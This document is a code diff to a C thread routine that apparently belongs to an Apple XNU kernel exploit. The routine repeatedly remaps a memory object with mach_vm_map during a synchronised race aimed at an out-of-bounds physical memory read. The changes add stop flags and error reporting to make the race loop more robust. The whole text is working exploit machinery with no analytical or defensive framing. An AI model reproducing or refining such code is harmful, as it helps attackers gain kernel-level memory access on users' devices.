@@ -3,17 +3,25 @@
 void* free_thread_worker(void* arg) {
     free_thread_shared_t* shared = arg;
 
-    while (atomic_load_explicit(&shared->free_thread_start, memory_order_seq_cst) == 0);
+    while (atomic_load_explicit(&shared->free_thread_start, memory_order_seq_cst) == 0) {
+        if (atomic_load_explicit(&shared->stop_sync, memory_order_seq_cst) != 0) return NULL;
+    }
+    if (atomic_load_explicit(&shared->stop_sync, memory_order_seq_cst) != 0) return NULL;
 
     // physically contiguous object address
     mach_vm_address_t free_target = atomic_load_explicit(&shared->free_target_sync, memory_order_seq_cst);
     // physically contiguous object size
     mach_vm_size_t free_target_size = atomic_load_explicit(&shared->free_target_size_sync, memory_order_seq_cst);
 
-    while (atomic_load_explicit(&shared->go_sync, memory_order_seq_cst) == 0);
+    while (atomic_load_explicit(&shared->go_sync, memory_order_seq_cst) == 0) {
+        if (atomic_load_explicit(&shared->stop_sync, memory_order_seq_cst) != 0) return NULL;
+    }
 
-    while (atomic_load_explicit(&shared->go_sync, memory_order_seq_cst) != 0) {
-        while (atomic_load_explicit(&shared->race_sync, memory_order_seq_cst) == 0);
+    while (atomic_load_explicit(&shared->go_sync, memory_order_seq_cst) != 0 && atomic_load_explicit(&shared->stop_sync, memory_order_seq_cst) == 0) {
+        while (atomic_load_explicit(&shared->race_sync, memory_order_seq_cst) == 0) {
+            if (atomic_load_explicit(&shared->stop_sync, memory_order_seq_cst) != 0) return NULL;
+        }
+        if (atomic_load_explicit(&shared->stop_sync, memory_order_seq_cst) != 0) return NULL;
 
         // target_object_sync here on first physical_oob_read_mo call is memory_object from mem entry
         mach_port_t target_object = (mach_port_t)atomic_load_explicit(&shared->target_object_sync, memory_order_seq_cst);
@@ -66,9 +74,8 @@ void* free_thread_worker(void* arg) {
         kern_return_t kr = mach_vm_map(mach_task_self(), &target_addr, free_target_size, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, target_object, target_object_offset, false, VM_PROT_DEFAULT,
                                        VM_PROT_DEFAULT, VM_INHERIT_NONE);
         if (kr != KERN_SUCCESS) {
-            // LOG_DEBUG("free_thread: target_object_offset: %#llx, free_target_size: %#llx", target_object_offset, free_target_size);
             LOG_ERR("free_thread: mach_vm_map: %s (%d)", mach_error_string(kr), kr);
-            while (1);
+            atomic_store_explicit(&shared->map_error, kr, memory_order_seq_cst);
         }
 
         atomic_store_explicit(&shared->race_sync, 0, memory_order_seq_cst);
